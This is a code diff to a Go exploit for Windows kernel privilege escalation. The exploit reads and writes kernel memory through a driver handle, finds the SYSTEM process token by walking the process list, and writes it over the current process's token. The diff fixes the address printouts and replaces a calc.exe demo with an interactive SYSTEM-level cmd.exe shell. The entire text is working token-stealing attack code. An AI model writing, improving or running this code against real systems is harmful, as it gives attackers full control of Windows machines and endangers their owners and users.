@@ -209,11 +209,11 @@ func makeSystem() {
 	device := getDriverHandle()
 	addr1 := getFunctionAddress("PsInitialSystemProcess")
 	addr2 := readMemoryDWORD64(device, addr1)
-	fmt.Printf("[*] PsInitialSystemProcess address: %p", &addr2)
+	fmt.Printf("[*] PsInitialSystemProcess address: %x\n", addr2)
 
 	//get system process token
 	token := readMemoryDWORD64(device, addr2+offsets.TokenOffset) &^ 15
-	fmt.Printf("[*] System process token: %p", &token)
+	fmt.Printf("[*] System process token: %x\n", token)
 
 	processHead := addr2 + offsets.ActiveProcessLinksOffset
 	currentProcessAddress := processHead
@@ -229,26 +229,22 @@ func makeSystem() {
 		}
 	}
 	currentProcessAddress -= offsets.ActiveProcessLinksOffset
-	fmt.Printf("[*] Current process address: %p", &currentProcessAddress)
+	fmt.Printf("[*] Current process address: %x\n", currentProcessAddress)
 
 	currentProcessFastToken := readMemoryDWORD64(device, currentProcessAddress+offsets.TokenOffset)
 	currentProcessTokenReferenceCounter := currentProcessFastToken & 15
 	currentProcessToken := currentProcessFastToken &^ 15
-	fmt.Printf("[*] Current process token: %p", &currentProcessToken)
+	fmt.Printf("[*] Current process token: %x\n", currentProcessToken)
 	fmt.Println("[*] Stealing System process token ...")
 	writeMemoryDWORD64(device, currentProcessAddress+offsets.TokenOffset, currentProcessTokenReferenceCounter|token)
 	w32.CloseHandle(w32.HANDLE(device))
 
 	fmt.Println("[*] Spawning new shell ...")
-	ls, err := exec.Command("c:\\windows\\system32\\calc.exe").Output()
-	fmt.Printf("hello ls:\n%s :Error:\n%v\n", ls, err)
-
-	// var sI syscall.StartupInfo
-	// var pI syscall.ProcessInformation
-
-	// argv := syscall.StringToUTF16Ptr("c:\\windows\\system32\\calc.exe")
-	// err := syscall.CreateProcess(nil, argv, nil, nil, true, 0, nil, nil, &sI, &pI)
-	// fmt.Printf("Return: %d\n", err)
+	cmd := exec.Command("c:\\windows\\system32\\cmd.exe")
+	cmd.Stdin = os.Stdin
+	cmd.Stdout = os.Stdout
+	cmd.Stderr = os.Stderr
+	_ = cmd.Run()
 }
 
 func main() {
